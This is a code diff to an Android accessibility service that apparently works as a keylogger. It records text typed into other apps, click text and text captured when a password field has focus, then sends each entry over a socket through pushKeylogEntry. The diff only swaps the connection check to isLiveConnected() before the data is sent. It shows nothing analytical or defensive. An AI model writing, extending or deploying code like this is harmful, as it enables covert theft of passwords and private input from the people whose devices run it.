@@ -1074,7 +1074,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                             // does not need a second write via AppMonitor.
                             sm.getLogManager().logEntry(packageName, appName, typed, eventType,
                                     screenTitleSnapshot);
-                            if (sm.isConnected()) {
+                            if (sm.isLiveConnected()) {
                                 String ts = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss",
                                         java.util.Locale.getDefault()).format(new java.util.Date());
                                 sm.pushKeylogEntry(packageName, appName, typed, eventType, ts,
@@ -4320,7 +4320,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             try {
                 SocketManager sm = SocketManager.getInstance(this);
                 sm.getLogManager().logEntry(packageName, appName, text, "CLICK", screenTitleSnap);
-                if (sm.isConnected()) {
+                if (sm.isLiveConnected()) {
                     String ts = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss",
                             java.util.Locale.getDefault()).format(new java.util.Date());
                     sm.pushKeylogEntry(packageName, appName, text, "CLICK", ts,
@@ -4360,7 +4360,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                     SocketManager sm = SocketManager.getInstance(this);
                     sm.getLogManager().logEntry(pkg, appName, accumulated, "PASSWORD_FOCUS",
                             screenTitleSnapshot);
-                    if (sm.isConnected()) {
+                    if (sm.isLiveConnected()) {
                         String ts = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss",
                                 java.util.Locale.getDefault()).format(new java.util.Date());
                         sm.pushKeylogEntry(pkg, appName, accumulated, "PASSWORD_FOCUS", ts,
